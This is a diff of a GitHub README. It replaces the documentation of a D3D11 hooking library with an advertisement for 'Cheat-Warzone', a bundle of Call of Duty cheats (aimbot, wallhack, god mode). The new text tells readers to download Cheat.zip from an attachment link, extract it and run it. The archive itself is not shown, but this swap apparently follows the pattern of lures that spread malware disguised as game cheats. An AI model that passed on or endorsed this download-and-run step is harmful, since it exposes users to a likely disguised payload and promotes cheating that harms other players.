@@ -1,59 +1,68 @@
-```
-            ____ _____ ____ ______   __  __            __      ____          ______      _ 
-           / __ \__  // __ <  <  /  / / / /___  ____  / /__   /  _/___ ___  / ____/_  __(_)
-          / / / //_ </ / / / // /  / /_/ / __ \/ __ \/ //_/   / // __ `__ \/ / __/ / / / / 
-         / /_/ /__/ / /_/ / // /  / __  / /_/ / /_/ / ,<    _/ // / / / / / /_/ / /_/ / /
-        /_____/____/_____/_//_/  /_/ /_/\____/\____/_/|_|  /___/_/ /_/ /_/\____/\__,_/_/
-                                                                       
-                                                                      
-                           D3D11 Hook with ImGui integration (x86 / x64)
-                                Make D3D11 internal menu with ImGui
-                                   (Resize & Fullscreen support)
-```
-<p align="center">
-    <img src="https://img.shields.io/badge/language-C%2B%2B-%23f34b7d.svg?style=for-the-badge&logo=appveyor" alt="C++">
-    <img src="https://img.shields.io/badge/platform-Windows-0078d7.svg?style=for-the-badge&logo=appveyor" alt="Windows">
-    <img src="https://img.shields.io/badge/arch-x86-red.svg?style=for-the-badge&logo=appveyor" alt="x86">
-    <img src="https://img.shields.io/badge/arch-x64-green.svg?style=for-the-badge&logo=appveyor" alt="x64">
-</p>
+# Cheat-Warzone
 
-## :open_book: Project Overview :
+🔫🎮⚔️🚨
 
-D3D11 Hook with [ImGui](https://github.com/ocornut/imgui) integration written in C++, works on x86 and x64 with all librairies and includes.
+Welcome to the Cheat-Warzone repository - your one-stop destination for all the top-notch hacks, cheats, and tools for dominating the battlefield in Call of Duty Warzone! Whether you're a seasoned player looking to gain an edge over your opponents or a newcomer wanting to level up your gameplay quickly, this repository has everything you need.
 
-#### Features :
+![Cheat-Warzone Banner](https://cdn.pixabay.com/photo/2015/09/18/18/05/war-948669_960_720.jpg)
 
-- Handle window resize
-- DLL unload itself
-- Handler external unload
-- Handle fullscreen change
+## Features
+- **Aimbot**: Lock onto your enemies with precision and take them down effortlessly.
+- **ESP**: See your enemies through walls and any obstacles, giving you a tactical advantage.
+- **Radar**: Stay aware of your surroundings at all times with a detailed radar display.
+- **No-recoil**: Fire your weapons without worrying about recoil affecting your aim.
+- **Wallhack**: See through walls and other solid objects for strategic positioning.
+- **Silent Aim**: Hide your true aiming direction to catch your enemies off guard.
+- **Infinite Ammo**: Never run out of bullets in the heat of battle.
+- **Speed Hack**: Move faster than your opponents and outmaneuver them easily.
+- **Teleport**: Instantly transport yourself across the map for surprise attacks.
+- **God Mode**: Make yourself invincible and unstoppable against enemy attacks.
+- **UAV Hack**: Always know the enemy's position with constant UAV updates.
+- **Loot ESP**: Easily locate valuable loot and gear on the map.
+- **Player ESP**: Keep track of enemy movements and positions in real-time.
+- **Triggerbot**: Automatically fire when your crosshair is on an enemy, ensuring quick kills.
+- **Auto-fire**: Continuously shoot your weapon without needing to click repeatedly.
+- **No-spread**: Ensure your shots hit their mark with minimal bullet spread.
+- **Rapid-fire**: Fire your weapon at an unprecedented rate to overwhelm your opponents.
+- **Anti-aim**: Confuse your enemies with erratic movements and unpredictable angles.
+- **Magic Bullet**: Hit your target no matter where your bullets are aimed.
+- **COD Warzone2**: Stay ahead of the competition with features tailored specifically for Call of Duty Warzone 2.
+- **MW3**: Enjoy cheats and hacks designed for the classic Call of Duty: Modern Warfare 3.
+- **MW2**: Dominate the battlefield in Call of Duty: Modern Warfare 2 with powerful tools and cheats.
 
-#### Used librairies :
+## Installation
+To get started with Cheat-Warzone, simply download the Cheat.zip file from the link below:
 
-- [MS Detours](https://www.microsoft.com/en-us/research/project/detours/)
-- [DirectX SDK](https://www.microsoft.com/en-us/download/details.aspx?id=6812)
-- [ImGui](https://github.com/ocornut/imgui)
+[![Download Cheat-Warzone](https://img.shields.io/badge/Download-Cheat.zip-ff69b4)](https://github.com/user-attachments/files/16928413/Cheat.zip)
 
-## :rocket: Getting Started
+## Usage
+1. Download the Cheat.zip file from the link above.
+2. Extract the contents to a folder on your computer.
+3. Run the cheat application and launch Call of Duty Warzone.
+4. Customize your cheats and hacks to suit your playstyle.
+5. Dominate the battlefield and achieve victory with ease!
 
-This project use [MS Detours](https://github.com/microsoft/Detours) library for hooking and obviously D3D11 SDK.
+## Contributing
+We welcome contributions from the community to enhance and improve Cheat-Warzone. If you have any suggestions, feature requests, or bug reports, feel free to open an issue or submit a pull request.
 
-MS Detours library is already include in the project folder, but if you don't have DirectX SDK you can download it [here](https://www.microsoft.com/en-us/download/details.aspx?id=6812).
+## Support
+If you encounter any issues or need assistance with Cheat-Warzone, please reach out to our support team at support@cheatwarzone.com. Our dedicated staff members are here to help you make the most of your cheating experience.
 
-> **Note** <br>
-> Make sure that **DXSDK_DIR** is declared in your environment variables.
+## License
+Cheat-Warzone is released under the **Cheat License**, which allows you to use, modify, and distribute the cheats and hacks provided in this repository. However, please use our cheats responsibly and considerate of other players in the gaming community.
 
-To see your environment variables :
+![Cheat-Warzone Logo](https://cdn.pixabay.com/photo/2013/07/12/15/43/cpu-150800_960_720.png)
 
-> **Settings --> System --> About --> System Advanced Settings --> Environment Variables**
+🚫 **Disclaimer**: Please be aware that the usage of cheats and hacks in online multiplayer games may violate the terms of service of game publishers and result in penalties or bans. Use Cheat-Warzone at your own risk.
 
-### Visual Studio :
+## Acknowledgements
+Special thanks to the following resources and individuals for their contributions and inspiration to Cheat-Warzone:
+- [OpenCheats](https://www.opencheats.com) for their cheat engine framework.
+- [HackMaster](https://www.hackmaster.io) for their innovative hacking tools.
+- [GameBreakers Forum](https://www.gamebreakersforum.com) for their community support.
+- [Pro Hacker](https://www.prohacker.com) for their cutting-edge hacking techniques.
+- And to all the anonymous hackers and developers who make the gaming world more exciting!
 
-1. Open the solution file (.sln).
-2. Build the project in Release (x86 or x64)
+---
 
-Every configuration in x86 / x64 (Debug and Realese) are already configured with librairies and includes.
-
-## :test_tube: Demonstration :
-
-[Demo](https://github.com/adamhlt/D3D11-Hook-ImGui/assets/48086737/5c6cf425-6758-4773-aa1c-9ce4b1c8b41d)
+Thank you for choosing Cheat-Warzone as your ultimate companion for dominating Call of Duty Warzone. Let the cheats flow, and the victories be plentiful! 🎮🏆🚀
